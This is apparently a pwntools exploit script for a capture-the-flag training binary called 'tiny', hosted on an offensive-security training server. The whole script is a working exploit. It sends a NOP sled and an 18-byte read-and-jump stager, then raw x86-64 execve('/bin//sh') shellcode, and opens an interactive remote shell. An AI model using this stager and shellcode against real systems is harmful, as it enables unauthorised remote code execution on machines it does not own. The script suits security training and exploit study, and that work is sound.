from pwn import *
#r=process("./tiny")
r = remote("bin.training.offdef.it", 4101)

#gdb.attach(r,'''
#	b *0x0000555555554d13
#''')

#input()

shellcode=b"\x90"*50

#18 byte [read code]
shellcode+=b"\x6A\x00\x58\x6A\x00\x5F\x52\x5E\x68\xFF\x00\x00\x00\x5A\x0F\x05\xFF\xE6"

shellcode+=b"\x90"*190

#24 byte [actual shellcode]
shellcode+=b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\x6A\x3B\x58\x99\x0F\x05"

r.send(shellcode)

r.interactive()